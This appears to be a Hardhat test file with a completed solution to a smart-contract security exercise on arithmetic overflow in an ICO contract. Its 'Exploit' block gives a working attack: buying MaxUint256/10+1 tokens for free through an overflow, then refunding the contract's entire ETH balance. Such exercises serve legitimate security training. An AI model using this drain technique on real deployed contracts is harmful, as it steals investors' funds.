const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Arithmetic Over/Underflow Exercise 3', function () {

    let deployer, investor1, investor2, investor3, attacker;

    // Investment amounts (in ETH)
    const FIRST_INVESTOR_INVESTED = ethers.utils.parseEther("520"); 
    const SECOND_INVESTOR_INVESTED = ethers.utils.parseEther("126");
    const THIRD_INVESTOR_INVESTED = ethers.utils.parseEther("54");
    const SECOND_INVESTOR_REFUNDED = ethers.utils.parseEther("26");

    const TOTAL_INVESTED = FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED)
    .add(THIRD_INVESTOR_INVESTED).sub(SECOND_INVESTOR_REFUNDED)

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, investor1, investor2, investor3, attacker] = await ethers.getSigners();

        // Attacker starts with 1 ETH
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0xDE0B6B3A7640000", // 1 ETH
        ]);
        this.initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
        expect(this.initialAttackerBalance).to.be.equal(ethers.utils.parseEther("1"))

        // Deploy
        const AIvestICOFactory = await ethers.getContractFactory(
            'contracts/arithmetic-overflows-3/AIvestICO.sol:AIvestICO', 
            deployer
        );
        this.ico = await AIvestICOFactory.deploy();
        // Get Token Contract
        this.token = await ethers.getContractAt(
            'contracts/arithmetic-overflows-3/AIvestToken.sol:IERC20',
            await this.ico.token()
        );
    });

    it('Investments Tests', async function () {

        // Should Fail (no ETH)
        await expect(this.ico.connect(investor1).buy(
            FIRST_INVESTOR_INVESTED.mul(10))).to.be.revertedWith("wrong ETH amount sent");

        // Should Succeed
        await this.ico.connect(investor1).buy(
            FIRST_INVESTOR_INVESTED.mul(10),
            {value: FIRST_INVESTOR_INVESTED}
        );
        await this.ico.connect(investor2).buy(
            SECOND_INVESTOR_INVESTED.mul(10),
            {value: SECOND_INVESTOR_INVESTED}
        );
        await this.ico.connect(investor3).buy(
            THIRD_INVESTOR_INVESTED.mul(10),
            {value: THIRD_INVESTOR_INVESTED}
        );

        // Tokens and ETH balance checks
        expect(await this.token.balanceOf(investor1.address))
        .to.be.equal(FIRST_INVESTOR_INVESTED.mul(10));
        expect(await this.token.balanceOf(investor2.address))
        .to.be.equal(SECOND_INVESTOR_INVESTED.mul(10));
        expect(await this.token.balanceOf(investor3.address))
        .to.be.equal(THIRD_INVESTOR_INVESTED.mul(10));
        
        expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(
            FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED).add(THIRD_INVESTOR_INVESTED)
        )
        
    });

    it('Refund Tests', async function () {
        
        // Should Fail (investor doesn't own so many tokens)
        await expect(this.ico.connect(investor2).refund(
            SECOND_INVESTOR_INVESTED.mul(100),
        )).to.be.revertedWith("ERC20: burn amount exceeds balance");

        // Should succeed
        await this.ico.connect(investor2).refund(SECOND_INVESTOR_REFUNDED.mul(10));

        // Tokens and ETH balance check
        expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(TOTAL_INVESTED)
        expect(await this.token.balanceOf(investor2.address))
        .to.be.equal(SECOND_INVESTOR_INVESTED.sub(SECOND_INVESTOR_REFUNDED).mul(10));
    });


    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        let tokensToBuy = ethers.constants.MaxUint256.div(10).add(1);
        await this.ico.connect(attacker).buy(tokensToBuy);
        let contractETHBalance = await ethers.provider.getBalance(this.ico.address);
        await this.ico.connect(attacker).refund(contractETHBalance.mul(10))

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker should drain all ETH from ICO contract
        expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(0);
        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
            this.initialAttackerBalance.add(TOTAL_INVESTED).sub(ethers.utils.parseEther("0.2"))
        );
    });
});
